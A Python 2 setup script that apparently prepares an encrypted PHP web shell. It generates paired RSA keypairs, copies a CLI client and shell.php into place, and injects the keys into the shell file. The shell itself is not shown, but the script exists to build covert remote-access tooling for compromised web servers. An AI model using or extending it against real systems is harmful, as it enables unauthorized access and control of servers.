#!/usr/bin/python 

import M2Crypto
import os
import shutil

def empty_callback():
	return

def replace(fileToSearch,keyPath,keyWord):
	key= open(keyPath).read()
	file=open(fileToSearch).read()
	file=file.replace(keyWord,key)
	
	f = open(fileToSearch,'w')
	f.write(file)
	f.close() 
	
	return	

def insert_keys():
	replace('./shell.php','./shell/pub.key','[PUBLIC-KEY]')
	replace('./shell.php','./shell/priv.key','[PRIVATE-KEY]')
	return
	
def setup_files():
	cwd=os.getcwd()
	dir=(cwd + "/local")
        shdir=(cwd + "/shell")
	
        if not os.path.exists(dir):
                os.makedirs(dir)
        if not os.path.exists(shdir):
                os.makedirs(shdir)

	if os.path.exists(cwd + "CLI.py"):
		try:
			os.remove(cwd + "CLI.py")
		except:
			print "Cannot remove CLI.py, Permissions Problem"
			os.exit(-1)	
	shutil.copyfile('./src/CLI.py', './CLI.py')
	os.chmod('./CLI.py', 0755)
	shutil.copyfile('./src/shell.php', './shell.php')	

def generate_key():
	
	print "Setting up Files.."
	setup_files()

	print "Generating Random Seed.."

	M2Crypto.Rand.rand_seed (os.urandom(1024))
	
	print "Generating CLI Keypair.."
	private=M2Crypto.RSA.gen_key(1024,65537, empty_callback)
	private.save_key('./local/priv.key', None)
	private.save_pub_key('./shell/pub.key')

	print "Generating Shell Keypair.." 
	public=M2Crypto.RSA.gen_key(1024,65537, empty_callback)
	public.save_key('./shell/priv.key', None)
	public.save_pub_key ('./local/pub.key')
	
	print "Linking The Shells.."
	insert_keys()
	
if __name__ == "__main__":
	generate_key()
